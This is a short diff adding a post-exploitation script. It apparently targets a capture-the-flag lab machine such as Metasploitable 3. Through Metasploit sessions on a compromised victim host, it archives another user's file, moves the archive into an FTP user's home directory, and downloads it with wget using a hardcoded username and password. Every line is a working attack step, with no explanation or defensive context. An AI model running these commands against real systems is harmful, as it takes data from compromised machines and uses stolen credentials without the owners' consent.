@@ -1,0 +1,5 @@
+sessions -i $SESSION -c 'tar -czf 10_of_clubs.wav.tar.gz /home/artoo_detoo/music/10_of_clubs.wav'
+sessions -i $SESSION -c 'mv 10_of_clubs.wav.tar.gz /home/boba_fett/'
+wget --no-passive --ftp-user=boba_fett --ftp_password=mandalorian1 ftp://$VICTIM_IP/10_of_clubs.wav.tar.gz
+
+
